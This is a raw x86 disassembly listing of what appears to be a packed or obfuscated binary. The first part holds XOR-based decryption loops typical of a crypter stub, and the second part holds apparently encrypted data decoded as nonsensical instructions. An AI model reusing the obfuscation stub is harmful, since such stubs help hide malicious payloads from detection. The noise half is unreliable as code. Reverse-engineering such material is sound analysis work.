  403a34:	and    DWORD PTR ds:0x428e9b,0x0
  403a3e:	mov    eax,ds:0x428e9b
  403a43:	inc    eax
  403a44:	mov    ds:0x428e9b,eax
  403a49:	cmp    DWORD PTR ds:0x428e9b,0xd
  403a50:	jb     0x403a8c
  403a56:	jmp    0x403a67
  403a5b:	push   DWORD PTR [ebp-0x18]
  403a5e:	push   DWORD PTR [ebp-0x1c]
  403a61:	call   DWORD PTR ds:0x42aa13
  403a67:	cmp    DWORD PTR ds:0x428e9b,0xc
  403a6e:	jne    0x403a7f
  403a74:	mov    eax,ds:0x428e9b
  403a79:	inc    eax
  403a7a:	mov    ds:0x428e9b,eax
  403a7f:	cmp    DWORD PTR ds:0x428e9b,0x15
  403a86:	jb     0x403a3e
  403a8c:	mov    dl,BYTE PTR [ebp-0x21]
  403a8f:	xor    eax,0x61a1
  403a94:	mov    eax,DWORD PTR [ebp-0x34]
  403a97:	xor    al,0xaf
  403a99:	mov    cl,0xa
  403a9b:	sub    cl,al
  403a9d:	add    DWORD PTR ds:0x428ea3,0x32c3
  403aa7:	add    dl,cl
  403aa9:	sbb    ecx,DWORD PTR ds:0x428eb3
  403aaf:	mov    ecx,DWORD PTR [ebp-0x1c]
  403ab2:	sub    DWORD PTR ds:0x428ea7,0x428e8f
  403abc:	xor    cl,0xaf
  403abf:	sub    cl,0xa
  403ac2:	sub    DWORD PTR ds:0x428ea3,0x68fd
  403acc:	ror    dl,cl
  403ace:	sub    DWORD PTR ds:0x428e6b,ebx
  403ad4:	xor    eax,eax
  403ad6:	mov    eax,DWORD PTR [ebp-0xc]
  403ad9:	add    DWORD PTR ds:0x428e8f,ebx
  403adf:	mov    BYTE PTR [eax+ebx*1+0x800],dl
  403ae6:	mov    ecx,DWORD PTR ds:0x4292ab
  403aec:	mov    eax,ds:0x429737
  403af1:	sub    ecx,eax
  403af3:	and    ecx,DWORD PTR [ecx+eax*1]
  403af6:	mov    eax,DWORD PTR [ebp-0xc]
  403af9:	mov    DWORD PTR ds:0x428e33,0x15
  403b03:	cmp    DWORD PTR ds:0x428e33,0x0
  403b0a:	je     0x403b3f
  403b10:	cmp    DWORD PTR ds:0x428e33,0x25
  403b17:	jbe    0x403b3f
  403b1d:	jmp    0x403b2d
  403b22:	push   0x428e23
  403b27:	call   DWORD PTR ds:0x42aa17
  403b2d:	mov    ecx,DWORD PTR ds:0x428e33
  403b33:	dec    ecx
  403b34:	mov    DWORD PTR ds:0x428e33,ecx
  403b3a:	jmp    0x403b03
  403b3f:	mov    ecx,DWORD PTR [ebp-0x28]
  403b42:	neg    DWORD PTR ds:0x428e5b
  403b48:	sub    eax,edi
  403b4a:	sub    DWORD PTR ds:0x428e8b,0x4b02
  403b54:	xor    eax,esi
  403b56:	mov    DWORD PTR ds:0x428ec7,0x6067
  403b60:	cmp    eax,ecx
  403b62:	jne    0x403b8c
  403b68:	mov    eax,DWORD PTR [ebp-0x8]
  403b6b:	mov    ecx,DWORD PTR [ebp-0x10]
  403b6e:	xor    eax,esi
  403b70:	xor    ecx,esi
  403b72:	sub    eax,ecx
  403b74:	sub    eax,edi
  403b76:	xor    eax,esi
  403b78:	mov    DWORD PTR [ebp-0x8],eax
  403b7b:	mov    eax,DWORD PTR [ebp-0x10]
  403b7e:	xor    eax,esi
  403b80:	mov    ecx,0xffcd8d8a
  403b85:	sub    ecx,eax
  403b87:	jmp    0x403b9b
  403b8c:	mov    eax,DWORD PTR [ebp-0x10]
  403b8f:	xor    eax,esi
  403b91:	mov    ecx,0xffcd8d0a
  403b96:	sub    ecx,eax
  403b98:	add    ecx,DWORD PTR [ebp-0xc]
  403b9b:	mov    DWORD PTR [ebp-0xc],ecx
  403b9e:	mov    eax,DWORD PTR [ebp-0x8]
  403ba1:	cmp    eax,0xf89c85a5
  403ba6:	jne    0x403815
  403bac:	mov    DWORD PTR [ebp-0x34],0x9
  403bb3:	mov    ecx,DWORD PTR [ebp+0x8]
  403bb6:	xor    ecx,esi
  403bb8:	add    ecx,edi
  403bba:	jmp    0x403e1a
  403bbf:	lea    eax,[ecx+ebx*1]
  403bc2:	mov    DWORD PTR [ebp-0x2c],eax
  403bc5:	mov    eax,DWORD PTR [ebp-0x58]
  403bc8:	sub    eax,ecx
  403bca:	mov    DWORD PTR [ebp-0x1c],eax
  403bcd:	mov    eax,DWORD PTR [ebp-0x1c]
  403bd0:	mov    DWORD PTR [ebp-0x14],eax
  403bd3:	mov    eax,DWORD PTR [ebp-0x2c]
  403bd6:	mov    DWORD PTR [ebp-0x38],0xf89c85a5
  403bdd:	mov    DWORD PTR [ebp-0x54],eax
  403be0:	mov    DWORD PTR [ebp-0x20],0xf89c85a4
  403be7:	mov    eax,DWORD PTR [ebp-0x38]
  403bea:	xor    eax,esi
  403bec:	add    eax,edi
  403bee:	mov    DWORD PTR [ebp-0x10],eax
  403bf1:	mov    eax,DWORD PTR [ebp-0x38]
  403bf4:	xor    eax,esi
  403bf6:	add    eax,edi
  403bf8:	mov    DWORD PTR [ebp-0x8],eax
  403bfb:	mov    DWORD PTR [ebp-0x2c],0xf89c8585
  403c02:	mov    DWORD PTR [ebp-0x44],0xf89c85be
  403c09:	mov    eax,DWORD PTR [ebp-0x38]
  403c0c:	mov    edx,DWORD PTR [ebp-0x14]
  403c0f:	xor    eax,esi
  403c11:	add    eax,edi
  403c13:	cmp    edx,eax
  403c15:	je     0x403e0e
  403c1b:	mov    eax,DWORD PTR [ebp-0x20]
  403c1e:	xor    eax,esi
  403c20:	mov    edx,0xffcd8d0a
  403c25:	sub    edx,eax
  403c27:	add    edx,DWORD PTR [ebp-0x14]
  403c2a:	mov    eax,DWORD PTR [ebp-0x20]
  403c2d:	mov    ebx,DWORD PTR [ebp-0x10]
  403c30:	xor    eax,esi
  403c32:	add    eax,edi
  403c34:	imul   eax,ebx
  403c37:	cmp    eax,edx
  403c39:	ja     0x403e0b
  403c3f:	mov    edx,DWORD PTR [ebp-0x10]
  403c42:	mov    eax,DWORD PTR [ebp-0x14]
  403c45:	mov    ebx,DWORD PTR [ebp-0x2c]
  403c48:	sub    eax,edx
  403c4a:	xor    ebx,esi
  403c4c:	xor    edx,edx
  403c4e:	add    ebx,edi
  403c50:	div    ebx
  403c52:	mov    DWORD PTR [ebp-0x8],eax
  403c55:	mov    eax,DWORD PTR [ebp-0x44]
  403c58:	mov    edx,DWORD PTR [ebp-0x8]
  403c5b:	xor    eax,esi
  403c5d:	add    eax,edi
  403c5f:	cmp    edx,eax
  403c61:	jbe    0x403c71
  403c67:	mov    eax,DWORD PTR [ebp-0x44]
  403c6a:	xor    eax,esi
  403c6c:	add    eax,edi
  403c6e:	mov    DWORD PTR [ebp-0x8],eax
  403c71:	mov    eax,DWORD PTR [ebp-0x2c]
  403c74:	mov    edx,DWORD PTR [ebp-0x8]
  403c77:	xor    eax,esi
  403c79:	add    eax,edi
  403c7b:	imul   eax,edx
  403c7e:	mov    DWORD PTR [ebp-0x8],eax
  403c81:	mov    eax,DWORD PTR [ebp-0x38]
  403c84:	mov    edx,DWORD PTR [ebp-0x8]
  403c87:	xor    eax,esi
  403c89:	add    eax,edi
  403c8b:	cmp    edx,eax
  403c8d:	je     0x403df4
  403c93:	mov    eax,DWORD PTR [ebp-0x8]
  403c96:	mov    DWORD PTR [ebp-0x18],eax
  403c99:	mov    eax,DWORD PTR [ebp-0x10]
  403c9c:	add    eax,DWORD PTR [ebp-0x54]
  403c9f:	mov    DWORD PTR [ebp-0x1c],0xf89c85a5
  403ca6:	mov    DWORD PTR [ebp-0x8],eax
  403ca9:	mov    eax,0xf89c85a4
  403cae:	mov    DWORD PTR [ebp-0x28],eax
  403cb1:	mov    DWORD PTR [ebp-0x5c],0xf89c85a3
  403cb8:	mov    DWORD PTR [ebp-0x40],0xf89c85a2
  403cbf:	mov    DWORD PTR [ebp-0x30],eax
  403cc2:	mov    eax,DWORD PTR [ebp-0x1c]
  403cc5:	xor    eax,esi
  403cc7:	add    eax,edi
  403cc9:	jmp    0x403db0
  403cce:	mov    DWORD PTR [ebp-0x4c],0xf89c85ba
  403cd5:	mov    DWORD PTR [ebp-0x50],0xf89c858f
  403cdc:	mov    eax,DWORD PTR [ebp-0x30]
  403cdf:	mov    edx,DWORD PTR [ebp-0xc]
  403ce2:	xor    eax,esi
  403ce4:	add    eax,edi
  403ce6:	imul   eax,edx
  403ce9:	mov    edx,DWORD PTR [ebp-0x8]
  403cec:	mov    al,BYTE PTR [eax+edx*1]
  403cef:	mov    BYTE PTR [ebp-0x1],al
  403cf2:	mov    eax,DWORD PTR [ebp-0x30]
  403cf5:	mov    edx,DWORD PTR [ebp-0xc]
  403cf8:	xor    eax,esi
  403cfa:	add    eax,edi
  403cfc:	imul   eax,edx
  403cff:	mov    edx,DWORD PTR [ebp-0x5c]
  403d02:	xor    edx,esi
  403d04:	add    eax,edx
  403d06:	mov    edx,DWORD PTR [ebp-0x8]
  403d09:	movzx  eax,BYTE PTR [eax+edx*1+0x3272f6]
  403d11:	mov    edx,DWORD PTR [ebp-0x4c]
  403d14:	xor    edx,esi
  403d16:	lea    eax,[edx+eax*1+0x3272f6]
  403d1d:	movzx  edx,BYTE PTR [ebp-0x1]
  403d21:	xor    edx,eax
  403d23:	mov    BYTE PTR [ebp-0x1],dl
  403d26:	mov    al,BYTE PTR [ebp-0x1]
  403d29:	mov    edx,DWORD PTR [ebp-0x30]
  403d2c:	mov    ebx,DWORD PTR [ebp-0xc]
  403d2f:	xor    edx,esi
  403d31:	add    edx,edi
  403d33:	imul   edx,ebx
  403d36:	mov    ebx,DWORD PTR [ebp-0x8]
  403d39:	mov    BYTE PTR [edx+ebx*1],al
  403d3c:	mov    eax,DWORD PTR [ebp-0x30]
  403d3f:	mov    edx,DWORD PTR [ebp-0xc]
  403d42:	xor    eax,esi
  403d44:	add    eax,edi
  403d46:	imul   eax,edx
  403d49:	mov    edx,DWORD PTR [ebp-0x8]
  403d4c:	mov    al,BYTE PTR [eax+edx*1]
  403d4f:	mov    BYTE PTR [ebp-0x1],al
  403d52:	mov    eax,DWORD PTR [ebp-0x30]
  403d55:	mov    edx,DWORD PTR [ebp-0xc]
  403d58:	xor    eax,esi
  403d5a:	add    eax,edi
  403d5c:	imul   eax,edx
  403d5f:	mov    edx,DWORD PTR [ebp-0x28]
  403d62:	xor    edx,esi
  403d64:	add    eax,edx
  403d66:	mov    edx,DWORD PTR [ebp-0x8]
  403d69:	movzx  eax,BYTE PTR [eax+edx*1+0x3272f6]
  403d71:	mov    edx,DWORD PTR [ebp-0x50]
  403d74:	xor    edx,esi
  403d76:	lea    eax,[edx+eax*1+0x3272f6]
  403d7d:	movzx  edx,BYTE PTR [ebp-0x1]
  403d81:	xor    edx,eax
  403d83:	mov    BYTE PTR [ebp-0x1],dl
  403d86:	mov    al,BYTE PTR [ebp-0x1]
  403d89:	mov    edx,DWORD PTR [ebp-0x30]
  403d8c:	mov    ebx,DWORD PTR [ebp-0xc]
  403d8f:	xor    edx,esi
  403d91:	add    edx,edi
  403d93:	imul   edx,ebx
  403d96:	mov    ebx,DWORD PTR [ebp-0x8]
  403d99:	mov    BYTE PTR [edx+ebx*1],al
  403d9c:	mov    eax,DWORD PTR [ebp-0x40]
  403d9f:	mov    edx,DWORD PTR [ebp-0x28]
  403da2:	xor    eax,esi
  403da4:	xor    edx,esi
  403da6:	add    eax,edi
  403da8:	add    edx,edi
  403daa:	imul   eax,edx
  403dad:	add    eax,DWORD PTR [ebp-0xc]
  403db0:	mov    DWORD PTR [ebp-0xc],eax
  403db3:	mov    eax,DWORD PTR [ebp-0xc]
  403db6:	mov    edx,DWORD PTR [ebp-0x18]
  403db9:	cmp    edx,eax
  403dbb:	jb     0x403cce
  403dc1:	mov    eax,DWORD PTR [ebp-0x28]
  403dc4:	mov    edx,DWORD PTR [ebp-0x18]
  403dc7:	xor    eax,esi
  403dc9:	add    eax,edi
  403dcb:	imul   eax,edx
  403dce:	mov    edx,DWORD PTR [ebp-0x1c]
  403dd1:	xor    edx,esi
  403dd3:	add    edx,edi
  403dd5:	or     eax,edx
  403dd7:	mov    edx,DWORD PTR [ebp-0x20]
  403dda:	xor    edx,esi
  403ddc:	add    eax,edx
  403dde:	mov    edx,DWORD PTR [ebp-0x20]
  403de1:	xor    edx,esi
  403de3:	add    eax,edx
  403de5:	mov    edx,DWORD PTR [ebp-0x10]
  403de8:	lea    eax,[eax+edx*1+0x64e5ec]
  403def:	jmp    0x403e03
  403df4:	mov    eax,DWORD PTR [ebp-0x20]
  403df7:	mov    edx,DWORD PTR [ebp-0x10]
  403dfa:	xor    eax,esi
  403dfc:	lea    eax,[eax+edx*1+0x3272f6]
  403e03:	mov    DWORD PTR [ebp-0x10],eax
  403e06:	jmp    0x403c1b
  403e0b:	mov    ebx,DWORD PTR [ebp-0x3c]
  403e0e:	mov    eax,DWORD PTR [ebp+0xc]
  403e11:	xor    eax,esi
  403e13:	lea    ecx,[ecx+eax*1+0x3272f6]
  403e1a:	lea    eax,[ecx-0x3272f6]
  403e20:	xor    eax,esi
  403e22:	cmp    eax,0xf89c95a5
  403e27:	jne    0x403bbf
  403e2d:	dec    DWORD PTR [ebp-0x34]
  403e30:	jne    0x403bb3
  403e36:	mov    eax,DWORD PTR [ebp+0x8]
  403e39:	mov    ecx,DWORD PTR [ebp+0xc]
  403e3c:	mov    edx,DWORD PTR [ebp+0x8]
  403e3f:	xor    ecx,esi
  403e41:	mov    cl,BYTE PTR [ecx+ebx*1+0x3272f6]
  403e48:	xor    eax,esi
  403e4a:	mov    al,BYTE PTR [eax+ebx*1+0x3272f6]
  403e51:	xor    edx,esi
  403e53:	mov    BYTE PTR [edx+ebx*1+0x3272f6],cl
  403e5a:	mov    ecx,DWORD PTR [ebp+0xc]
  403e5d:	xor    ecx,esi
  403e5f:	jmp    0x4061b8
  403e64:	outs   dx,BYTE PTR ds:[esi]
  403e65:	pop    edi
  403e66:	or     al,BYTE PTR [bp+0xa]
  403e6a:	push   cs
  403e6b:	pop    ss
  403e6c:	xor    edx,esi
  403e6e:	cld    
  403e6f:	fwait
  403e70:	xor    dh,BYTE PTR [eax+0x60473f2b]
  403e76:	add    DWORD PTR [ebx-0x7c7c9fb9],0xffffffa6
  403e7d:	cwde   
  403e7e:	js     0x403e28
  403e80:	enter  0x8821,0x5
  403e84:	inc    ecx
  403e85:	xlat   BYTE PTR ds:[ebx]
  403e86:	cmp    edx,esp
  403e88:	push   eax
  403e89:	scas   al,BYTE PTR es:[edi]
  403e8a:	(bad)  
  403e8b:	stos   BYTE PTR es:[edi],al
  403e8c:	pushf  
  403e8d:	rol    DWORD PTR [esi],1
  403e8f:	dec    edi
  403e90:	xor    esi,DWORD PTR [ebp+0x20]
  403e93:	(bad)  
  403e94:	repnz test eax,0x4afc6a5d
  403e9a:	jmp    0x403f05
  403e9c:	ins    DWORD PTR es:[edi],dx
  403e9d:	sbb    eax,0xd57d4df5
  403ea2:	pop    ss
  403ea3:	or     DWORD PTR [esi],0xde1c1665
  403ea9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403eaa:	pop    es
  403eab:	push   cs
  403eac:	stos   BYTE PTR es:[edi],al
  403ead:	sbb    dh,BYTE PTR [edi+0x7749b2e4]
  403eb3:	ds enter 0xf67b,0xb1
  403eb8:	div    dh
  403eba:	in     al,0x44
  403ebc:	mov    eax,ds:0x4dbef648
  403ec1:	(bad)  
  403ec2:	or     BYTE PTR [ebx+0x453dcae1],al
  403ec8:	pusha  
  403ec9:	sahf   
  403eca:	scas   eax,DWORD PTR es:[edi]
  403ecb:	ins    DWORD PTR es:[edi],dx
  403ecc:	xchg   ebp,eax
  403ecd:	retf   0x3e7d
  403ed0:	or     al,0x6e
  403ed2:	int    0xcd
  403ed4:	jmp    0x403f49
  403ed6:	sar    BYTE PTR [eax+0x3c],1
  403ed9:	out    0xfa,eax
  403edb:	mov    edi,0xbaaa3e28
  403ee0:	mov    bh,0x26
  403ee2:	or     DWORD PTR [esi],edx
  403ee4:	jns    0x403f63
  403ee6:	pop    eax
  403ee7:	mov    ss,ecx
  403ee9:	push   0x25
  403eeb:	cmp    dl,BYTE PTR [ecx+0xaa01485]
  403ef1:	enter  0xc2e9,0x67
  403ef5:	sub    ebp,ebp
  403ef7:	loop   0x403f50
  403ef9:	add    ebp,DWORD PTR ds:0xc94dff6b
  403eff:	and    ah,BYTE PTR [esi+0x5856b21c]
  403f05:	fnop   
  403f07:	inc    edi
  403f08:	js     0x403f55
  403f0a:	out    dx,eax
  403f0b:	add    BYTE PTR [edx-0x49ac51a3],dl
  403f11:	sbb    edi,DWORD PTR [eax-0x67]
  403f14:	mov    al,0x7f
  403f16:	mov    bl,0x3
  403f18:	sbb    esp,DWORD PTR [ebx+0x47]
  403f1b:	jp     0x403f20
  403f1d:	jmp    0x2ff22c67
  403f22:	add    ah,BYTE PTR [ecx+0x1b]
  403f25:	out    dx,eax
  403f26:	repnz test al,0x24
  403f29:	loope  0x403ee8
  403f2b:	pushw  es
  403f2d:	int    0x47
  403f2f:	ret    0x167
  403f32:	sub    esp,esp
  403f34:	int3   
  403f35:	sub    al,0x9b
  403f37:	fcomp  QWORD PTR [edi-0x7d4f0a77]
  403f3d:	dec    esi
  403f3e:	je     0x403f33
  403f40:	add    eax,DWORD PTR [edi]
  403f42:	cdq    
  403f43:	mov    edi,0x8cbbd265
  403f48:	xor    dh,BYTE PTR [esi+0x64]
  403f4b:	mov    ebp,DWORD PTR [esi+0x61930df6]
  403f51:	xchg   edi,eax
  403f52:	cwde   
  403f53:	and    ah,BYTE PTR [edi]
  403f55:	cld    
  403f56:	xor    DWORD PTR [edi-0x30685cdc],0xaf8fdb1d
  403f60:	cdq    
  403f61:	pop    ebx
  403f62:	cmp    al,0xbf
  403f64:	jnp    0x403fde
  403f66:	mov    edx,0xc4aa0439
  403f6b:	dec    esi
  403f6c:	shl    DWORD PTR [eax-0x2a],1
  403f6f:	sbb    al,ah
  403f71:	pushf  
  403f72:	pop    ebx
  403f73:	xlat   BYTE PTR ds:[ebx]
  403f74:	(bad)  
  403f75:	mov    DWORD PTR [edi-0x52dbd59f],eax
  403f7b:	popf   
  403f7c:	jmp    0x70aef6f4
  403f81:	pop    ds
  403f82:	jo     0x403fbb
  403f84:	dec    eax
  403f85:	bound  eax,QWORD PTR [edi-0x59]
  403f88:	adc    al,0xd8
  403f8a:	fdiv   QWORD PTR [eax]
  403f8c:	jb     0x403f14
  403f8e:	mov    gs,WORD PTR [edx]
  403f90:	mov    WORD PTR [eax+0x3c],es
  403f93:	out    0xc4,eax
  403f95:	loop   0x403ff2
  403f97:	mov    ch,0x72
  403f99:	pusha  
  403f9a:	cmp    ebx,DWORD PTR [edx+0x70af4ec2]
  403fa0:	add    bl,BYTE PTR [ebx]
  403fa2:	xor    BYTE PTR [edi],dh
  403fa4:	inc    esp
  403fa5:	pop    ss
  403fa6:	lock push edx
  403fa8:	fisubr WORD PTR [ebx]
  403faa:	xor    BYTE PTR [ebx+esi*2+0x72a2181c],cl
  403fb1:	loopne 0x403f41
  403fb3:	add    al,0xf6
  403fb5:	xchg   edx,eax
  403fb6:	push   0xffffffcd
  403fb8:	jmp    0xc31a:0xd6a2553a
  403fbf:	dec    eax
  403fc0:	jnp    0x403f84
  403fc2:	mov    dl,0x98
  403fc4:	pop    ebx
  403fc5:	lock je 0x403fbe
  403fc8:	fsubr  QWORD PTR [esi+ebp*4+0x3c]
  403fcc:	xor    bh,dl
  403fce:	mov    dh,BYTE PTR [edi]
  403fd0:	sub    al,0x0
  403fd2:	or     DWORD PTR ds:0x299ae4a9,ebx
  403fd8:	lods   al,BYTE PTR ds:[esi]
  403fd9:	out    0xb2,al
  403fdb:	sahf   
  403fdc:	arpl   WORD PTR [esp+ebp*8+0x52],ax
  403fe0:	dec    ebp
  403fe1:	jns    0x403fd7
  403fe3:	test   eax,0x17eba72
  403fe8:	addr16 lock test al,0xe8
  403fec:	xchg   esi,eax
  403fed:	xchg   ecx,eax
  403fee:	cmc    
  403fef:	mov    eax,ds:0xb8b778e3
  403ff4:	repnz xlat BYTE PTR ds:[ebx]
  403ff6:	push   ebp
  403ff7:	in     eax,0xcd
  403ff9:	sub    DWORD PTR [eax-0x38b19577],esp
  403fff:	cwde   
  404000:	xchg   edx,eax
  404001:	outs   dx,DWORD PTR ds:[esi]
  404002:	push   ecx
  404003:	adc    DWORD PTR [eax+0x49],eax
  404006:	lds    esp,FWORD PTR [eax-0x4892eb6f]
  40400c:	push   ds
  40400d:	das    
  40400e:	mov    ds:0x744d611f,eax
  404013:	psubq  mm5,QWORD PTR ds:0x8b5d8496
  40401a:	lahf   
  40401b:	xor    esp,DWORD PTR [ecx]
  40401d:	mov    eax,0x5490f9a1
  404022:	out    dx,eax
  404023:	in     al,dx
  404024:	in     al,0x19
  404026:	jge    0x403fd8
  404028:	or     ecx,ecx
  40402a:	or     BYTE PTR [ebp+0x4b],dl
  40402d:	scas   eax,DWORD PTR es:[edi]
  40402e:	fcmovnu st,st(0)
  404030:	mov    bl,0x15
  404032:	cdq    
  404033:	ja     0x404069
  404035:	mov    eax,ds:0x35072fb2
  40403a:	popa   
  40403b:	daa    
  40403c:	imul   esp,DWORD PTR [edi+ebx*2-0x67],0x74
  404041:	xchg   esi,eax
  404042:	push   ebp
  404043:	inc    DWORD PTR [edi]
  404045:	sub    DWORD PTR [ebp-0x6e],edi
  404048:	sbb    al,0x4b
  40404a:	aaa    
  40404b:	dec    esi
  40404c:	cmp    ebx,ecx
  40404e:	ja     0x404077
  404050:	loopne 0x4040b7
  404052:	test   DWORD PTR [esi+0x73],edi
  404055:	and    edx,DWORD PTR [eax-0x10eb4369]
  40405b:	pop    esi
  40405c:	sbb    ah,BYTE PTR [edi-0x45f638f4]
  404062:	push   ss
  404063:	or     al,0xe8
  404065:	imul   ecx,DWORD PTR [ecx-0xbd02097],0xb84cee7b
  40406f:	adc    dh,ch
  404071:	pop    ds
  404072:	leave  
  404073:	aam    0x1b
  404075:	bound  edx,QWORD PTR [ecx-0x5b]
  404078:	mov    bl,ah
  40407a:	push   es
  40407b:	pop    es
  40407c:	xchg   ebx,eax
  40407d:	aas    
  40407e:	mov    edi,0x63321c4d
  404083:	int3   
  404084:	loopne 0x40406c
  404086:	mov    edx,0x252cc13d
  40408b:	add    esp,esi
  40408d:	test   edi,0x3edf03b7
  404093:	jg     0x40404f
  404095:	push   es
  404096:	sbb    bh,BYTE PTR [esi+0x6c]
  404099:	mov    BYTE PTR [ebx+ecx*1-0x73ceaab0],dh
  4040a0:	inc    eax
  4040a1:	clc    
  4040a2:	sub    BYTE PTR [eax+0x77a439f2],ch
  4040a8:	rol    bh,1
  4040aa:	repz retf 0xe4ff
  4040ae:	arpl   WORD PTR [eax+esi*4-0x24],bp
  4040b2:	fstp   DWORD PTR [edx]
  4040b4:	rcl    BYTE PTR [edi+0x23394fff],cl
  4040ba:	cmp    ebp,edi
  4040bc:	out    dx,eax
  4040bd:	inc    esp
  4040be:	retf   
  4040bf:	cli    
  4040c0:	pop    eax
  4040c1:	sub    al,0x80
  4040c3:	xor    eax,0x5d86a738
  4040c8:	pop    edx
  4040c9:	adc    bl,BYTE PTR [eax+edx*8+0x2cc2a6c0]
  4040d0:	add    bh,BYTE PTR [eax+ebp*8+0x38]
  4040d4:	in     al,dx
  4040d5:	inc    esi
  4040d6:	xor    al,0x38
  4040d8:	test   edi,0xc828c0dc
  4040de:	mov    DWORD PTR [ebp+0x6c],eax
  4040e1:	adc    bh,dh
  4040e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4040e4:	cdq    
  4040e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4040e6:	enter  0x7a46,0x51
  4040ea:	call   0x10b0c867
  4040ef:	and    BYTE PTR [ecx+edx*4-0x79],ah
  4040f3:	dec    ebx
  4040f4:	mov    bl,0x7
  4040f6:	mov    esp,0x662d8e3c
  4040fb:	test   eax,0xb375f391
  404100:	ja     0x404126
  404102:	daa    
  404103:	dec    edi
  404104:	push   ss
  404105:	sbb    eax,0xfa413bdd
  40410a:	(bad)  
  40410b:	test   eax,0xd5422a3c
  404110:	dec    eax
  404111:	and    cl,cl
  404113:	jp     0x4040ce
  404115:	loope  0x4040a8
  404117:	adc    DWORD PTR [ecx-0x7a],0x460c55ad
  40411e:	cmp    eax,0x377f730e
  404123:	pop    esi
  404124:	sar    BYTE PTR [esi],1
  404126:	mov    ecx,0x1f2ad14b
  40412b:	stos   BYTE PTR es:[edi],al
  40412c:	inc    esi
  40412d:	push   es
  40412e:	daa    
  40412f:	in     al,dx
  404130:	pop    esp
  404131:	jg     0x4040b4
  404133:	mov    edi,0xd45714a5
  404138:	sub    eax,0x1c7f7406
  40413d:	mov    al,ds:0x84b3f4c8
  404142:	adc    DWORD PTR [esp+eiz*4],eax
  404145:	outs   dx,BYTE PTR ds:[esi]
  404146:	out    0xa2,al
  404148:	pop    edx
  404149:	pop    es
  40414a:	or     DWORD PTR gs:[eax],ecx
  40414d:	jbe    0x404124
  40414f:	loop   0x40412f
  404151:	retf   
  404152:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404153:	jmp    0x404171
  404155:	cld    
  404156:	push   esp
  404157:	xchg   DWORD PTR [edx+0x7ed83e3e],ecx
  40415d:	out    dx,eax
  40415e:	(bad)
  404162:	dec    eax
  404163:	push   esi
  404164:	mov    al,ds:0x6524e836
  404169:	mov    dh,0x84
  40416b:	test   BYTE PTR [edx+0x35],ch
  40416e:	pop    ebx
  40416f:	add    al,0x7e
  404171:	xchg   esi,eax
  404172:	(bad)  
  404173:	jbe    0x404143
  404175:	xchg   ebp,ebp
  404177:	in     al,0xa0
  404179:	jne    0x4041ba
  40417b:	pop    edi
  40417c:	jne    0x40411d
  40417e:	pushw  0x2d8d
  404182:	rcl    esi,cl
  404184:	in     eax,dx
  404185:	lods   al,BYTE PTR ds:[esi]
  404186:	popf   
  404187:	xor    dl,BYTE PTR [edi-0x61]
  40418a:	pop    eax
  40418b:	in     al,0x60
  40418d:	pop    esp
  40418e:	aaa    
  40418f:	lds    edx,FWORD PTR [ebp-0x12a41a56]
  404195:	ret    
  404196:	sub    eax,0xf135e070
  40419b:	xchg   edi,eax
  40419c:	(bad)
  4041a1:	call   0x55fd:0x727f0103
  4041a8:	dec    esp
  4041a9:	adc    edx,DWORD PTR [edi]
  4041ab:	jmp    0x4de1:0x2983109d
  4041b2:	pop    es
  4041b3:	mov    ah,0x98
  4041b5:	sbb    al,BYTE PTR [ebp-0x20]
  4041b8:	xor    DWORD PTR [edi],eax
  4041ba:	push   0x38
  4041bc:	hlt    
  4041bd:	dec    esp
  4041be:	test   al,0xa0
  4041c0:	outs   dx,DWORD PTR ds:[esi]
  4041c1:	mov    DWORD PTR [eax+0x758616d6],esp
  4041c7:	clc    
  4041c8:	cld    
  4041c9:	adc    al,BYTE PTR [esi+0x42]
  4041cc:	pop    edx
  4041cd:	inc    esp
  4041ce:	mov    eax,ds:0x1cf3e558
  4041d3:	stc    
  4041d4:	or     esp,DWORD PTR [ecx]
  4041d6:	mov    ss,ebx
  4041d8:	mov    bl,dh
  4041da:	add    al,0x78
  4041dc:	call   0xb75:0x72cafd5f
  4041e3:	icebp  
  4041e4:	imul   eax,DWORD PTR [ebx-0x78],0x9ff73fbb
  4041eb:	mov    esp,0xe3a7eb1d
  4041f0:	cmp    ecx,ecx
  4041f2:	pop    edi
  4041f3:	mov    esp,0xa40043a6
  4041f8:	mov    dh,0xc3
  4041fa:	sub    BYTE PTR [esi+0x77],0xe9
  4041fe:	aad    0xe
  404200:	ror    BYTE PTR [eax-0x4e],cl
  404203:	js     0x404233
  404205:	lea    edi,[eax-0x25f7ba6e]
  40420b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40420c:	xor    eax,0xe1d0ee55
  404211:	adc    esp,DWORD PTR [edi]
  404213:	inc    esp
  404214:	das    
  404215:	xchg   BYTE PTR [eax+0x3c019026],ch
  40421b:	or     ecx,DWORD PTR [edx-0x4db121ea]
  404221:	jecxz  0x404233
  404223:	shl    BYTE PTR [ecx+ebp*2],0x18
  404227:	push   ebp
  404228:	mov    ah,0x2a
  40422a:	pop    ss
  40422b:	push   ecx
  40422c:	iret   
  40422d:	ret    0x514f
  404230:	popa   
  404231:	inc    esp
  404232:	jmp    DWORD PTR [esi-0x7cb3bdc2]
  404238:	jnp    0x4041e5
  40423a:	nop
  40423b:	stc    
  40423c:	pop    edi
  40423d:	or     dh,ah
  40423f:	and    al,0xfb
  404241:	addr16 fmul st,st(2)
  404244:	ja     0x40425a
  404246:	xor    al,0xda
  404248:	dec    ecx
  404249:	fbstp  TBYTE PTR [edi-0x38]
  40424c:	test   al,0xca
  40424e:	mov    ecx,0x40d9c00d
  404253:	bound  edi,QWORD PTR [ecx-0x226a6bba]
  404259:	repz popa 
  40425b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40425c:	shl    DWORD PTR [ecx+eax*1],0x72
  404260:	xchg   esi,ebx
  404262:	push   ecx
  404263:	sti    
  404264:	int    0xb6
  404266:	and    dl,ah
  404268:	mov    esi,0xb34ea7e5
  40426d:	jmp    FWORD PTR [esi]
  40426f:	retf   
  404270:	and    dh,dh
  404272:	mov    bh,0xa9
  404274:	xchg   DWORD PTR [edx+0x3127e621],esp
  40427a:	in     al,dx
  40427b:	out    0x4b,eax
  40427d:	xlat   BYTE PTR ds:[ebx]
  40427e:	mov    gs,WORD PTR [edx+0x1d]
  404281:	adc    BYTE PTR [eax-0x59],ch
  404284:	jns    0x404232
  404286:	mov    dl,0xd2
  404288:	add    DWORD PTR [ecx-0x77],esp
  40428b:	xor    al,0xa
